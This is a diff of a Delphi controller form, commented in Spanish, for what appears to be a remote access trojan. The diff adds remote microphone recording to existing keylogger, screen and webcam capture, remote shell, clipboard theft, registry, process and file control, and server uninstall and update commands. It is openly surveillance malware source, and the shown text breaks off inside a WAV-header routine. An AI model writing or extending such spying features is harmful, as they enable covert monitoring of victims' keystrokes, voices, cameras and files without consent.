@@ -6,7 +6,7 @@ uses
   Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, CommCtrl,
   Dialogs, ComCtrls, XPMan, ImgList, Menus, ExtCtrls, StdCtrls, Buttons, {ScktComp,} Jpeg,
    Spin, IdThreadMgr, IdThreadMgrDefault, IdAntiFreezeBase,
-  IdAntiFreeze, IdBaseComponent, IdComponent, IdTCPServer, ShellAPI,ActiveX, gnugettext;
+  IdAntiFreeze, IdBaseComponent, IdComponent, IdTCPServer, ShellAPI,ActiveX, gnugettext, MMsystem;
 
 type
   TFormControl = class(TForm)
@@ -166,7 +166,7 @@ type
     BtnRefrescarVentanas: TSpeedButton;
     TabRegistro: TTabSheet;
     PanelRegistro: TPanel;
-    Splitter1: TSplitter;
+    SplitterRegistro: TSplitter;
     TreeViewRegedit: TTreeView;
     ListViewRegistro: TListView;
     EditPathRegistro: TEdit;
@@ -227,6 +227,26 @@ type
     SpeedButtonGuardarLog: TSpeedButton;
     CheckBoxOnlineKeylogger: TCheckBox;
     SpeedButtonActivarKeylogger: TSpeedButton;
+    TabAudio: TTabSheet;
+    PanelAudio: TPanel;
+    GroupBoxAudio: TGroupBox;
+    ListViewAudioFormato: TListView;
+    SplitterAudio: TSplitter;
+    ListViewAudio: TListView;
+    LabelTamanioAudio: TLabel;
+    SpinEditAudio: TSpinEdit;
+    Label2: TLabel;
+    SpeedButtonCapAudio: TSpeedButton;
+    CheckBoxCapturarAudioAutomaticamente: TCheckBox;
+    CheckBoxAutoReproducir: TCheckBox;
+    ComboBoxAudioDevices: TComboBox;
+    SpeedButtonListarAudio: TSpeedButton;
+    PopupAudio: TPopupMenu;
+    Eliminar2: TMenuItem;
+    Reproducir1: TMenuItem;
+    Guardar1: TMenuItem;
+    ProgressBarAudio: TProgressBar;
+    Labellengthaudio: TLabel;
     procedure FormCreate(Sender: TObject);
     procedure BtnRefrescarProcesosClick(Sender: TObject);
     procedure BtnRefrescarVentanasClick(Sender: TObject);
@@ -385,6 +405,17 @@ type
     procedure SpeedButtonClipBoard1Click(Sender: TObject);
     procedure SpeedButtonClipBoard2Click(Sender: TObject);
     procedure TabProcesosShow(Sender: TObject);
+    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
+    procedure SpeedButtonCapAudioClick(Sender: TObject);
+    procedure SpeedButtonListarAudioClick(Sender: TObject);
+    procedure CheckBoxCapturarAudioAutomaticamenteClick(Sender: TObject);
+    procedure PopupAudioPopup(Sender: TObject);
+    procedure TabAudioShow(Sender: TObject);
+    procedure SpinEditAudioChange(Sender: TObject);
+    procedure Eliminar2Click(Sender: TObject);
+    procedure Guardar1Click(Sender: TObject);
+    procedure Reproducir1Click(Sender: TObject);
+    procedure ListViewAudioFormatoClick(Sender: TObject);
 
   private  //Funciones y variables privadas que solo podemos usar en este Form
     Servidor: TIdPeerThread;
@@ -402,6 +433,8 @@ type
     IconosGrandes : TImageList;
     NumeroIconos : integer;
     MSGPosibles : array of string;
+    NumeroAudio : integer;
+    UltimoFormato : string; //último formato de audio utilizado
     function ObtenerRutaAbsolutaDeArbol(Nodo: TTreeNode): string;
     procedure AniadirClavesARegistro(Claves: string);
     procedure AniadirValoresARegistro(Valores: string);
@@ -423,7 +456,8 @@ type
     procedure OnRead(command: string; AThread: TIdPeerThread); overload;
     procedure OnReadFile(AThread: TIdPeerThread); overload;
     procedure CrearDirectoriosUsuario();  //Es llamada tambien desde el visor de Thumbnails
-    procedure pedirJPG(tipo:integer;info:string);//0=pantalla 1=webcam 2=thumnails info=thumbnailpath
+    procedure PedirPorSegundoSocket(tipo:integer;info:string);//0=pantalla 1=webcam 2=thumnails info=thumbnailpath
+    function InitWavFile(var Ms:TMemoryStream;nChannels,nSamplesPerSec,wBitsPerSample:word;b:string):   Integer;
   end;
 
 var
@@ -443,6 +477,7 @@ Function TFormControl.FileIconInit(FullInit: BOOL): BOOL; stdcall;
 type
 TFileIconInit = function(FullInit: BOOL): BOOL; stdcall;
 var
+
 ShellDLL: HMODULE;
 PFileIconInit: TFileIconInit;
 begin
@@ -526,6 +561,7 @@ begin
       
 
     self.DoubleBuffered := True;  //Evita parpadeos
+    self.ListviewArchivos.DoubleBuffered := true;
     recibiendofichero := false;
     CargarIconos(true);
     self.Height := 457;//Altura Predeterminada
@@ -813,6 +849,7 @@ begin
         Copy(EditPathArchivos.Text, 1, Length(EditPathArchivos.Text) - 1); //Borra el ultimo '\'
       EditPathArchivos.Text :=
         Copy(EditPathArchivos.Text, 1, LastDelimiter('\', EditPathArchivos.Text));
+      BtnActualizarArchivos.enabled := true;
     end;
     StatusBar.Panels[1].Text := Recibido;
     MessageBeep($FFFFFFFF);
@@ -944,6 +981,9 @@ begin
         Item.SubItems.Add(TempStr); //agrega el tipo
         TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
         Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
+        TempStr := StringReplace(TempStr,'Lectura', _('Lectura'),[rfReplaceAll]);
+        TempStr := StringReplace(TempStr,'Oculto', _('Oculto'),[rfReplaceAll]);
+        TempStr := StringReplace(TempStr,'Lectura', _('Lectura'),[rfReplaceAll]);
         Item.SubItems.Add(TempStr); //agrega atributos
         TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
         Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
@@ -1052,8 +1092,8 @@ begin
     end
     else
     begin
-     TempStr := StringReplace(Trim(Recibido),'|salto|', #10, [rfReplaceAll]);
-     TempStr := StringReplace((Tempstr),'|salto2|', #13, [rfReplaceAll]);
+      TempStr := StringReplace(Trim(Recibido),'|salto|', #10, [rfReplaceAll]);
+      TempStr := StringReplace((Tempstr),'|salto2|', #13, [rfReplaceAll]);
 
       MemoShell.Text := MemoShell.Text + Trim(Tempstr) + #13#10;
       SendMessage(MemoShell.Handle, EM_LINESCROLL, 0, length(TempStr));
@@ -1073,16 +1113,27 @@ begin
       Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
       Delete(Recibido, 1, Pos('|', Recibido));
       Item.SubItems.Add(copy(recibido, 1, pos('|', Recibido) - 1));
-      if(copy(recibido, 1, pos('|', Recibido) - 1) = _('Parado')) then
-        item.ImageIndex := 69
+      if(copy(recibido, 1, pos('|', Recibido) - 1) = 'Parado') then
+      begin
+        item.ImageIndex := 69;
+        item.SubItems[1] := _('Parado');
+      end
       else
-      if(copy(recibido, 1, pos('|', Recibido) - 1) = _('Corriendo')) then
-        item.ImageIndex := 71
+      if(copy(recibido, 1, pos('|', Recibido) - 1) = 'Corriendo') then
+      begin
+        item.ImageIndex := 71;
+        item.SubItems[1] := _('Corriendo');
+      end
       else
-      if(copy(recibido, 1, pos('|', Recibido) - 1) = _('Pausado')) then
-        item.ImageIndex := 70
+      if(copy(recibido, 1, pos('|', Recibido) - 1) = 'Pausado') then
+      begin
+        item.ImageIndex := 70;
+        item.SubItems[1] := _('Pausado');
+      end
       else
+      begin
         item.ImageIndex := 45;
+      end;
       Delete(Recibido, 1, Pos('|', Recibido));
     end;
     listviewservicios.Items.EndUpdate;
@@ -1215,9 +1266,23 @@ begin
   If Copy(Recibido,1,7) = 'GETCLIP' then
   begin
        Delete(Recibido,1,8);
-       MemoClipBoard.Text:= Recibido;
+       TempStr := StringReplace(Trim(Recibido),'|salto|', #10, [rfReplaceAll]);
+       TempStr := StringReplace((Tempstr),'|salto2|', #13, [rfReplaceAll]);
+       MemoClipBoard.Text:= TempStr;
+       SpeedButtonClipBoard1.enabled := true;
   end;
 
+  if Copy(Recibido,1,11) = 'GETADRIVERS' then
+  begin
+    Delete(Recibido,1,12);
+    ComboBoxAudioDevices.Items.Clear; //Primero limpiamos los que había
+    while Pos('|', Recibido) > 0 do
+    begin
+      ComboBoxAudioDevices.Items.Add(copy(Recibido, 1, pos('|', Recibido) - 1));
+      Delete(Recibido, 1, Pos('|', Recibido));
+    end;
+    SpeedButtonListarAudio.enabled := true;
+  end;
 // se fini del dispacher de comandos
 end;
 
@@ -1310,6 +1375,7 @@ begin
   end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+
 
 
 
@@ -1450,7 +1516,7 @@ begin
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('MINALLWIN')
   else
-    MessageDlg(Pchar(_('No estás conectado!')), mtWarning, [mbOK], 0);
+    MessageDlg(Pwidechar(_('No estás conectado!')), mtWarning, [mbOK], 0);
 end;
 
 //Activar Botón cerrar [X] de una ventana
@@ -1736,6 +1802,8 @@ begin
       mslistviewitem := ListViewArchivos.Selected
     else
       mslistviewitem := ListViewBuscar.Selected;
+    if MessageDlg(_('¿Está seguro que quiere borrar los archivos/carpetas seleccionados?'), mtConfirmation, [mbYes, mbNo], 0) = idno then
+      exit;
 
     while Assigned(mslistviewitem) do
     begin
@@ -1744,13 +1812,9 @@ begin
       else
         FilePath := mslistviewitem.Caption;
       if mslistviewitem.ImageIndex = 3 then
-      begin
-        if MessageDlg(_('¿Está seguro que quiere borrar la carpeta ') +extractfilename(FilePath) + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
-        Servidor.Connection.Writeln('DELFOLDER|' + FilePath);
-      end
+        Servidor.Connection.Writeln('DELFOLDER|' + FilePath)
       else
-      if MessageDlg(_('¿Está seguro que quiere borrar el archivo ') +extractfilename(FilePath) + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
-      Servidor.Connection.Writeln('DELFILE|' + FilePath);
+        Servidor.Connection.Writeln('DELFILE|' + FilePath);
       if PageControlArchivos.ActivePage = TabSheetVerArchivos then
         mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
       else
@@ -2191,9 +2255,9 @@ begin
     MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
     Exit;
   end;
-
-  imgCaptura.Picture := nil; //Refrescamos
-  PedirJPG(0,'');
+  //Aparece parpadeo
+  //imgCaptura.Picture := nil; //Refrescamos
+  PedirPorSegundoSocket(0,'');
 end;
 
 
@@ -2248,8 +2312,8 @@ begin
 
   if(ComboBoxWebcam.Items.Count=0) or (ComboBoxWebcam.Items.Text = '') then Exit;
 
-  imgWebcam.Picture := nil; //Refrescamos
-  PedirJPG(1,'');
+  //imgWebcam.Picture := nil; //Refrescamos// Genera un parpadeo
+  PedirPorSegundoSocket(1,'');
 end;
 
 procedure TFormControl.EnviarClickM(Sender: TObject; Button: TMouseButton;
@@ -2307,23 +2371,23 @@ begin
 
   if ComboBoxGestionDeServidor.Text = _('Cerrar') then
   begin
-    if MessageBox(Handle,
-      Pchar(_('¿Está seguro de que desea cerrar el servidor? Este no se volverá a iniciar si no están activos los métodos de auto-inicio.')),
-      Pchar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
+    if MessageBoxW(Handle,
+      Pwidechar(_('¿Está seguro de que desea cerrar el servidor? Este no se volverá a iniciar si no están activos los métodos de auto-inicio.')),
+      pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
       Servidor.Connection.Writeln('SERVIDOR|CERRAR|');
   end;
   if ComboBoxGestionDeServidor.Text = _('Desinstalar') then
   begin
-    if MessageBox(Handle,
-      Pchar(_('¿Está seguro de que desea desinstalar el servidor? ¡Este será removido completamente del equipo!')),
-      Pchar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
+    if MessageBoxW(Handle,
+      Pwidechar(_('¿Está seguro de que desea desinstalar el servidor? ¡Este será removido completamente del equipo!')),
+      Pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
       Servidor.Connection.Writeln('SERVIDOR|DESINSTALAR|');
   end;
   if ComboBoxGestionDeServidor.Text = _('Actualizar') then
   begin
-    if MessageBox(Handle,
-      Pchar(_('¿Está seguro de que desea actualizar el servidor? ¡Se volverá a enviar coolserver.dll!')),
-      pchar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
+    if MessageBoxW(Handle,
+      Pwidechar(_('¿Está seguro de que desea actualizar el servidor? ¡Se volverá a enviar coolserver.dll!')),
+      Pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
       Servidor.Connection.Writeln('SERVIDOR|ACTUALIZAR|');
   end;
 end;
@@ -2343,7 +2407,7 @@ begin
     self.TimerCaptureScreen.Enabled := False;
     exit;
   end;
-  pedirJPG(0,'');
+  PedirPorSegundoSocket(0,'');
 end;
 
 
@@ -2437,9 +2501,11 @@ var
   FilePath: ansistring;
   Size: int64;
   i: integer;
-  MS:TMemoryStream;
+  MS, MS2 : TMemoryStream;
   JPG: TJPEGImage;
-  tmpstr : string;
+  tmpstr, tempstr1, tempstr2, tempstr3 : string;
+  Item  : Tlistitem;
+  p : pointer;
 begin
   Buffer := Trim(Athread.Connection.ReadLn);
   if Copy(PChar(Buffer), 1, 7) = 'GETFILE' then
@@ -2518,7 +2584,7 @@ begin
       imgCaptura.Width := JPG.Width; //Establecemos ancho
       imgCaptura.Height := JPG.Height; //Establecemos alto
       imgcaptura.Picture.Assign(JPG);
-    end; 
+    end;
     LabelTamano.Caption := IntToStr(MS.Size div 1024); //Es interesante saber el tamaño
     if(PrefijoGuardarCaptura <> '') then
     begin
@@ -2532,6 +2598,7 @@ begin
     JPG.Free;
     BtnCapturarScreen.Enabled := True;
     RecibiendoJPG := false;
+    TimerCaptureScreen.Enabled  := CheckBoxAutoCapturaScreen.Checked; //Volvemos a activar
   end
   else if Copy(PChar(Buffer), 1, 13) = 'CAPTURAWEBCAM' then
   begin
@@ -2566,6 +2633,7 @@ begin
     JPG.Free;
 		BtnCapturarWebcam.Enabled := True;
     RecibiendoJPG := false;
+    TimerCamCapture.Enabled  := CheckBoxAutoCamCapture.Checked;
   end
   else if Copy(PChar(Buffer), 1, 9) = 'THUMBNAIL' then
   begin
@@ -2601,7 +2669,69 @@ begin
     ObteneryAniadirKeyloggerLog(AThread, Size); //lo obtenemos y añadimos al richedit
     SpeedButtonRecibirLog.Enabled := true;
     RecibiendoJPG := false;
+  end
+  else if Copy(PChar(Buffer), 1, 8) = 'GETAUDIO' then
+  begin
+    Delete(Buffer, 1, Pos('|', Buffer));
+    Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));  //Tamaño del Log
+    GenericBar := self.ProgressBarAudio;
+    MS := TMemoryStream.Create;
+    MS.Position := 0;
+    ObtenerScreenCap_CamCap(AThread, Size, MS);
+    MS.Position := 0;
+    if (MS.Size>10) then 
+    begin
+      item := listviewAudio.items.add();
+      NumeroAudio := NumeroAudio +1 ;
+      item.caption := inttostr(NumeroAudio);
+      item.subitems.add(inttostr(ms.size));
+
+      
+      {hz canal bits}
+
+      
+      TmpStr := UltimoFormato;
+      TempStr1 := Copy(TmpStr, 1, pos('-', TmpStr) - 1);     //HZ
+      Delete(TmpStr, 1, pos('-', TmpStr));
+      TempStr2 := Copy(TmpStr, 1, pos('-', TmpStr) - 1);     //Canal
+      Delete(TmpStr, 1, pos('-', TmpStr));
+      TempStr3 := TmpStr;                                    //Bits
+      item.subitems.add(inttostr(strtoint(tempstr1) * strtoint(Tempstr2)*strtoint(Tempstr3) div 8));
+      item.subitems.add(formatdatetime('hh:mm:ss',now));
+
+      Item.Subitems.Add(UltimoFormato);
+      //Creamos el archivo .wav
+      MS2 := TmemoryStream.create;
+      MS2.position := 0;
+      MS.position := 0;
+      setlength(buffer, ms.size);
+      ms.Read(buffer[1], ms.size);
+      InitWavFile(MS2, strtoint(TempStr2), strtoint(TempStr1), strtoint(TempStr3), buffer);
+      setlength(buffer, ms2.size);
+      ms2.Read(buffer[1], ms2.size);
+
+      Getmem(p,MS2.size);
+      MoveMemory(p, MS2.memory, MS2.size);
+      item.data := p; //Guardamos un puntero al sonido
+      item.subitems.add(inttostr(MS2.Size));  //Necesitaremos el tamaño de el puntero ;)
+      
+      if CheckBoxAutoReproducir.checked then
+        sndPlaySound(item.data, SND_MEMORY or SND_ASYNC); //Reproducimos si así se nos ordena
+
+    end
+
+    else
+    begin
+      Statusbar.panels[1].text := _('Error al capturar audio');//Error al capturar audio
+    end;
+    MS.Free;
+    MS2.free;
+    RecibiendoJPG := false;
   end;
+  
+  //Tenemos preferencia ;-)
+  if CheckBoxCapturarAudioAutomaticamente.checked then
+    SpeedButtonCapAudioClick(nil);
 end;
 
 procedure TFormControl.ObteneryAniadirKeyloggerLog(AThread: TIdPeerThread; filesize: int64);
@@ -2995,9 +3125,9 @@ begin
     MemoShell.Font := DlgFont.Font;
     ComboBoxShellCommand.Font := DlgFont.Font;
     if MemoShell.Color = MemoShell.Font.Color then
-      MessageBox(Handle,
-        Pchar(_('Se escogió el mismo color para la fuente y el fondo. Escoge otro.')),
-        Pchar(_('Advertencia')), 0 + MB_IconWarning);
+      MessageBoxw(Handle,
+        Pwidechar(_('Se escogió el mismo color para la fuente y el fondo. Escoge otro.')),
+        Pwidechar(_('Advertencia')), 0 + MB_IconWarning);
   end;
 end;
 
@@ -3008,9 +3138,9 @@ begin
     MemoShell.Color := DlgColors.Color;
     ComboBoxShellCommand.Color := DlgColors.Color;
     if MemoShell.Color = MemoShell.Font.Color then
-      MessageBox(Handle,
-        Pchar(_('Se escogió el mismo color para la fuente y el fondo. Escoge otro.')),
-        Pchar(_('Advertencia')), 0 + MB_IconWarning);
+      MessageBoxw(Handle,
+        PWidechar(_('Se escogió el mismo color para la fuente y el fondo. Escoge otro.')),
+        PWidechar(_('Advertencia')), 0 + MB_IconWarning);
   end;
 end;
 
@@ -3044,6 +3174,7 @@ end;
 
 procedure TFormControl.BtnServiciosClick(Sender: TObject);
 begin
+  if not BtnServicios.enabled then exit;
   BtnServicios.enabled := false;
   if not Servidor.Connection.Connected then
   begin
@@ -3376,7 +3507,7 @@ begin
       SpinCaptureScreen.Value := 0;
     if SpinCaptureScreen.Value > 30 then
       SpinCaptureScreen.Value := 30;
-      TimerCaptureScreen.Interval := SpinCaptureScreen.Value*1000+250;
+      TimerCaptureScreen.Interval := SpinCaptureScreen.Value*1000+{250}1;
   except
   end;
 end;
@@ -3389,7 +3520,7 @@ begin
     BtnCapturarScreen.click; //Hacemos la primera captura
   end;
 
-  TimerCaptureScreen.Interval := SpinCaptureScreen.Value*1000+250;
+  TimerCaptureScreen.Interval := SpinCaptureScreen.Value*1000+{250}1;
   TimerCaptureScreen.Enabled  := CheckBoxAutoCapturaScreen.Checked;
   TabScreenCap.Highlighted := TimerCaptureScreen.Enabled; //Para no olvidarnos que lo tenemos activo
 end;
@@ -3453,7 +3584,7 @@ begin
     BtnCapturarWebcam.Click; //Hacemos la primera captura
   end;
 
-  TimerCamCapture.Interval := SpinCam.Value*1000+250;
+  TimerCamCapture.Interval := SpinCam.Value*1000+{250}1; //Mejor +1 para que vaya más rápido en local :p
   TimerCamCapture.Enabled  := CheckBoxAutoCamCapture.Checked;
 	TabWebcam.Highlighted := TimerCamCapture.Enabled; //Para no olvidarnos que lo tenemos activo
 end;
@@ -3465,7 +3596,8 @@ begin
     self.TimerCamCapture.Enabled := False;
     exit;
   end;
-  PedirJPG(1,'');
+  PedirPorSegundoSocket(1,'');
+  
 end;
 
 procedure TFormControl.CheckBoxMostrarVentanasOcultasClick(
@@ -3531,16 +3663,15 @@ if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\De
 CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\');
 end;
 
-procedure TFormControl.pedirJPG(tipo:integer;info:string);//0=pantalla 1=webcam 2=thumnails info=thumbnailpath
-var
-Pantallaautomatico : boolean;
-WebcamAutomatico : boolean;
+procedure TFormControl.PedirPorSegundoSocket(tipo:integer;info:string);//0=pantalla 1=webcam 2=thumnails info=thumbnailpath
 begin          //la funcion que pide las capturas de webcam, de pantalla y los thumbnails
   if (RecibiendoJPG) then exit;   //Se piden por aqui para en el futuro crear un sistema por turnos 
   RecibiendoJPG := true;
-  
+
   if(tipo = 0) then      //CAPSCREEN
   begin
+    if TimerCaptureScreen.enabled then
+      TimerCaptureScreen.enabled := not TimerCaptureScreen.enabled;  //Desactivamos el timer, será activado cuando recibamos la captura
     if FormVisorCaptura = nil then
       Servidor.Connection.Writeln('CAPSCREEN|' + IntToStr(TrackBarCalidad.Position)+'|'+inttostr(imgCaptura.Height)+'|')
     else
@@ -3548,6 +3679,8 @@ begin          //la funcion que pide las capturas de webcam, de pantalla y los t
   end
   else if (tipo = 1) then //webcam
   begin
+    if TimerCamCapture.enabled then
+      TimerCamCapture.enabled := not TimerCamCapture.enabled;  //Desactivamos el timer, será activado cuando recibamos la captura
     Servidor.Connection.Writeln('CAPTURAWEBCAM|' + IntToStr(ComboboxWebcam.ItemIndex) +
     '|' + IntToStr(TrackBarCalidadWebcam.Position));
   end
@@ -3558,6 +3691,10 @@ begin          //la funcion que pide las capturas de webcam, de pantalla y los t
   else if(tipo = 3)  then//KEYLOGGERLOG
   begin
     Servidor.Connection.Writeln('RECIBIRKEYLOGGER');
+  end
+  else if(tipo = 4) then
+  begin
+    Servidor.connection.writeln('GETAUDIO'+info);
   end;
 end;
 procedure TFormControl.Guardarimagen1Click(Sender: TObject);
@@ -3653,7 +3790,7 @@ procedure TFormControl.SpeedButtonRecibirLogClick(Sender: TObject);
 begin
   if not Servidor.Connection.Connected then exit;
   SpeedButtonRecibirLog.enabled := false;  //Por estetica
-  pedirJPG(3,''); //no es un jpeg pero bueno......
+  PedirPorSegundoSocket(3,'');
 end;
 
 procedure TFormControl.SpeedButtonActivarKeyloggerClick(Sender: TObject);
@@ -3984,11 +4121,11 @@ begin
     while Assigned(mslistviewitem) do
     begin
       CurrentAtrib := '';
-      if not (pos('Oculto',mslistviewitem.subitems[2]) > 0) then //cambiamos
+      if not (pos(_('Oculto'),mslistviewitem.subitems[2]) > 0) then //cambiamos
         CurrentAtrib := 'Oculto ';
-      if (pos('Sistema',mslistviewitem.subitems[2]) > 0) then
+      if (pos(_('Sistema'),mslistviewitem.subitems[2]) > 0) then
         CurrentAtrib := CurrentAtrib+'Sistema ';
-      if (pos('Lectura',mslistviewitem.subitems[2]) > 0) then
+      if (pos(_('Lectura'),mslistviewitem.subitems[2]) > 0) then
         CurrentAtrib := CurrentAtrib+'Lectura ';
 
       Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
@@ -4011,11 +4148,11 @@ begin
     while Assigned(mslistviewitem) do
     begin
       CurrentAtrib := '';
-      if (pos('Oculto',mslistviewitem.subitems[2]) > 0) then //cambiamos
+      if (pos(_('Oculto'),mslistviewitem.subitems[2]) > 0) then //cambiamos
         CurrentAtrib := 'Oculto ';
-      if not (pos('Sistema',mslistviewitem.subitems[2]) > 0) then
+      if not (pos(_('Sistema'),mslistviewitem.subitems[2]) > 0) then
         CurrentAtrib := CurrentAtrib+'Sistema ';
-      if (pos('Lectura',mslistviewitem.subitems[2]) > 0) then
+      if (pos(_('Lectura'),mslistviewitem.subitems[2]) > 0) then
         CurrentAtrib := CurrentAtrib+'Lectura ';
 
       Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
@@ -4038,11 +4175,11 @@ begin
     while Assigned(mslistviewitem) do
     begin
       CurrentAtrib := '';
-      if (pos('Oculto',mslistviewitem.subitems[2]) > 0) then //cambiamos
+      if (pos(_('Oculto'),mslistviewitem.subitems[2]) > 0) then //cambiamos
         CurrentAtrib := 'Oculto ';
-      if (pos('Sistema',mslistviewitem.subitems[2]) > 0) then
+      if (pos(_('Sistema'),mslistviewitem.subitems[2]) > 0) then
         CurrentAtrib := CurrentAtrib+'Sistema ';
-      if not (pos('Lectura',mslistviewitem.subitems[2]) > 0) then
+      if not (pos(_('Lectura'),mslistviewitem.subitems[2]) > 0) then
         CurrentAtrib := CurrentAtrib+'Lectura ';
 
       Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
@@ -4183,8 +4320,7 @@ end;
 procedure TFormControl.FormClose(Sender: TObject;
   var Action: TCloseAction);
 begin
-  FormMain.ControlWidth := self.Width;
-  FormMain.ControlHeight := self.Height;
+
   CheckBoxAutoCapturaScreen.checked := false;
   CheckBoxAutoCamCapture.checked := false;
   CheckBoxOnlineKeylogger.checked := false;
@@ -4263,18 +4399,25 @@ begin
       if PageControlArchivos.ActivePage = TabSheetBuscar then
         SpeedButtonBuscar.click;
     end
-    else if PageControl.activepage = TabProcesos then
-      BtnRefrescarProcesos.click
-    else if PageControl.activepage = TabVentanas then
-      BtnRefrescarVentanas.click
-    else if PageControl.activepage = TabRegistro then
-      BtnVerRegisto.click
-    else if PageControl.activepage = TabServicios then
-      BtnServicios.click
-    else if PageControl.activepage = TabScreencap then
-      BtnCapturarScreen.click
-    else if PageControl.activepage = TabWebcam then
-      BtnCapturarWebcam.click;
+    else if PageControl.ActivePage = TabManagers then
+    begin
+      if PageControlManagers.activepage = TabProcesos then
+        BtnRefrescarProcesos.click
+      else if PageControlManagers.activepage = TabVentanas then
+        BtnRefrescarVentanas.click
+      else if PageControlManagers.activepage = TabRegistro then
+        BtnVerRegisto.click
+      else if PageControlManagers.activepage = TabServicios then
+        BtnServicios.click
+
+    end
+    else if PageControl.ActivePage = TabVigilancia then
+    begin
+      if PageControlVigilancia.activepage = TabScreencap then
+        BtnCapturarScreen.click
+      else if PageControlVigilancia.activepage = TabWebcam then
+        BtnCapturarWebcam.click;
+    end;
   end;
 end;
 
@@ -4288,6 +4431,8 @@ end;
 // Portapapeles!
 procedure TFormControl.SpeedButtonClipBoard1Click(Sender: TObject);
 begin
+  if not SpeedButtonClipBoard1.enabled then exit;
+  SpeedButtonClipBoard1.enabled := false;
   if Servidor.Connection.Connected then
   begin
     Servidor.Connection.Writeln('GETCLIP');
@@ -4296,10 +4441,15 @@ begin
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 procedure TFormControl.SpeedButtonClipBoard2Click(Sender: TObject);
+var
+  TempStr : string;
 begin
   if Servidor.Connection.Connected then
   begin
-    Servidor.Connection.Writeln('SETCLIP|'+ MemoClipBoard.Text);
+    TempStr := MemoClipBoard.Text;
+    TempStr := StringReplace(Trim(tempstr),#10, '|salto|', [rfReplaceAll]);
+    TempStr := StringReplace((Tempstr),#13, '|salto2|', [rfReplaceAll]);
+    Servidor.Connection.Writeln('SETCLIP|'+ TempStr);
   end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
@@ -4310,6 +4460,264 @@ procedure TFormControl.TabProcesosShow(Sender: TObject);
 begin
   if(FormOpciones.CheckBoxAutoRefrescar.checked) then
    BtnRefrescarProcesos.click;
+end;
+
+procedure TFormControl.FormCloseQuery(Sender: TObject;
+  var CanClose: Boolean);
+begin
+  FormMain.ControlWidth := self.Width;
+  FormMain.ControlHeight := self.Height;
+end;
+
+procedure TFormControl.SpeedButtonCapAudioClick(Sender: TObject);
+var
+  formato : string;
+  hz, canal, bits : string;
+  i : integer;
+begin
+  for i := 0 to ListViewAudioFormato.items.count-1 do
+    if ListViewAudioFormato.items[i].checked then
+      ListViewAudioFormato.items[i].selected := true;
+  if strtointdef(Spineditaudio.text,-1) = -1 then
+  begin
+    statusbar.panels[1].text := _('Mínimo 1 segundo');
+  end;
+  if strtointdef(copy(comboboxaudiodevices.text, 1,1),-1) = -1 then
+  begin
+    statusbar.panels[1].text := _('Dispositivo de audio no válido');
+  end
+  else
+  if ListViewAudioFormato.selected = nil then
+  begin
+    statusbar.panels[1].text := _('Selecciona un formato de audio');
+  end
+  else
+  begin
+    Hz := copy(listviewaudioformato.selected.caption, 1, pos(' ', listviewaudioformato.selected.caption)-1);
+
+    if listviewaudioformato.selected.subitems[0] = 'Mono' then
+      Canal := '1'
+    else
+      Canal := '2';
+      
+    Bits := listviewaudioformato.selected.subitems[1];
+    
+    UltimoFormato := hz+'-'+canal+'-'+bits;
+    PedirporSegundosocket(4,'|'+Spineditaudio.text+'|'+hz+'-'+canal+'-'+bits+'|'+copy(comboboxaudiodevices.text, 1,1)+'|');
+  end;
+end;
+
+  //Pedimos que nos listen los dipositivos de audio disponibles;
+  //Además también nos listan los formatos de audio que admite cada uno de los dispositivos
+procedure TFormControl.SpeedButtonListarAudioClick(Sender: TObject);
+begin
+  if not SpeedButtonListarAudio.enabled then exit;
+  SpeedButtonListarAudio.enabled := false;
+  if Servidor.Connection.Connected then
+  begin
+   Servidor.connection.writeln('GETADRIVERS');
+  end
+  else
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+end;
+
+procedure TFormControl.CheckBoxCapturarAudioAutomaticamenteClick(
+  Sender: TObject);
+begin
+  if CheckBoxCapturarAudioAutomaticamente.checked then
+  begin
+    SpeedButtonCapAudioClick(nil);
+    TabAudio.highlighted := true;
+  end
+  else
+    TabAudio.highlighted := false;
+end;
+
+procedure TFormControl.PopupAudioPopup(Sender: TObject);
+var
+  status : boolean;
+  i : integer;
+begin
+  if listviewaudio.selected = nil then
+    status := false
+  else
+    status := true;
+
+  for i:=0 to popupaudio.items.count-1 do
+    popupaudio.items[i].enabled := status;
+end;
+
+procedure TFormControl.TabAudioShow(Sender: TObject);
+begin
+  if(FormOpciones.CheckBoxAutoRefrescar.checked) and (ComboboxAudioDevices.text = '') then
+    SpeedButtonListarAudio.click;
+end;
+
+function TFormControl.InitWavFile(var Ms:TMemoryStream;nChannels, nSamplesPerSec, wBitsPerSample:word;b:string):   Integer;
+var
+    RiffSize : integer;
+    Fmt_Size : integer;
+    WaveBuffLen : integer;
+    wFormato : TWaveFormatEx;
+const
+  RiffStr = 'RIFF';
+  WaveStr = 'WAVE';
+  Fmt_Str = 'fmt ';
+  DataStr = 'data';
+begin
